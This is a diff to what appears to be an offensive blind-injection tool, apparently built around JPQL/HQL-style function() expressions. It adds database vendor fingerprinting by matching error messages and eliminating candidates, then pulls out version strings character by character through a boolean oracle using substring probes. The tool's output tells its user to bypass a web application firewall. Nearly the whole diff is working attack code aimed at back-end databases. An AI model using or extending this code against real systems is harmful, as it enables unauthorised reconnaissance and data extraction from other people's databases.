@@ -558,7 +558,20 @@ def _fn_not_found() -> bool:
     msg = (LAST_MSG or "").lower()
     if not msg:
         return False
-    return ("function" in msg) and ("does not exist" in msg or "not found" in msg)
+    # Common vendor messages seen when a scalar function is unknown/invalid
+    patterns = [
+        "function does not exist",
+        "does not exist",
+        "not found",
+        "unknown function",
+        "no such function",
+        "is not recognized as a function or procedure",
+        "is not recognized as a built-in function name",
+        "undefined function",
+        "no function matches",
+        "invalid identifier",  # oracle ora-00904 often summarized
+    ]
+    return any(p in msg for p in patterns)
 
 def detect_db_vendor_and_version() -> tuple[str , str ]:
     """
@@ -622,7 +635,9 @@ def detect_db_vendor_and_version() -> tuple[str , str ]:
     except Exception:
         table_empty = None
 
-    # Decision ladder
+    # First pass: function-based fingerprints (fast, low-cost when supported)
+    eliminated = set()
+    names_order = [p[0] for p in probes]
     for name, fp_expr, ver_expr, hint_fn in probes:
         ok = _is_not_null(fp_expr)
         if ok is True:
@@ -666,6 +681,7 @@ def detect_db_vendor_and_version() -> tuple[str , str ]:
         else:
             # If function-not-found is clearly reported, it isn't this vendor.
             if _fn_not_found():
+                eliminated.add(name)
                 continue
             # If table is empty and the call did not error (message blank/benign), accept vendor.
             if table_empty is True and not _fn_not_found():
@@ -673,6 +689,69 @@ def detect_db_vendor_and_version() -> tuple[str , str ]:
                 # We cannot reliably get a version without rows.
                 version = None
                 break
+
+    # Second pass: elimination heuristic. If only one vendor didn't trigger a clear
+    # function-not-found error, assume it's that vendor even if the boolean oracle
+    # couldn't flip due to empty table or restrictive predicate evaluation.
+    if not vendor:
+        remaining = [n for n in names_order if n not in eliminated]
+        if len(remaining) == 1:
+            vendor = remaining[0]
+            if vendor == "MySQL/MariaDB":
+                maria = _like("function('version')", "%MariaDB%")
+                if maria is True:
+                    vendor = "MariaDB"
+                elif maria is False:
+                    vendor = "MySQL"
+
+    # Fallback version extraction after vendor is known (even if found via elimination)
+    if vendor and not version:
+        charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ._- +()/"
+        def _recover(ver_expr: str, maxlen: int = 32):
+            if _len_ge(ver_expr, 1) is not True:
+                return None
+            v = ""
+            for pos in range(1, maxlen + 1):
+                advanced = False
+                for ch in charset:
+                    if _probe(f"function('substring',{ver_expr},{pos},1) = '{esc(ch)}'") is True:
+                        v += ch
+                        advanced = True
+                        break
+                if not advanced:
+                    break
+            return v or None
+
+        if vendor == "SQLServer":
+            expr = "function('CONCAT','', function('SERVERPROPERTY','ProductVersion'))"
+            version = _recover(expr) or version
+        elif vendor == "H2":
+            version = _recover("function('H2VERSION')") or version
+        elif vendor == "PostgreSQL":
+            version = _recover("function('current_setting','server_version')") or version
+        elif vendor in ("MySQL", "MariaDB", "MySQL/MariaDB"):
+            version = _recover("function('version')") or version
+        elif vendor == "HSQLDB":
+            version = _recover("function('DATABASE_VERSION')") or version
+        elif vendor == "SQLite":
+            version = _recover("function('sqlite_version')") or version
+        elif vendor == "Oracle":
+            # No simple scalar version via WHERE; keep existing hint behavior
+            pass
+        elif vendor == "Derby":
+            # Try several Derby property keys
+            derby_props = [
+                "derby.product.version",
+                "derby.versionNumber",
+                "derby.product.level",
+                "DataDictionaryVersion",
+            ]
+            for key in derby_props:
+                expr = f"function('SYSCS_UTIL.SYSCS_GET_DATABASE_PROPERTY','{key}')"
+                v = _recover(expr)
+                if v:
+                    version = v
+                    break
 
     return vendor, version
 
@@ -706,7 +785,7 @@ def main():
     if args.detect_db:
         vndr, ver = detect_db_vendor_and_version()
         if not vndr:
-            print("[detect-db] Unable to fingerprint vendor (oracle ambiguous). Try different endpoint or relax WAF.")
+            print("[detect-db] Unable to fingerprint vendor. Try a different endpoint, bypass WAF, or provide --entity for row presence hints.")
             return
         if ver:
             print(f"[detect-db] vendor={vndr}, version={ver}")
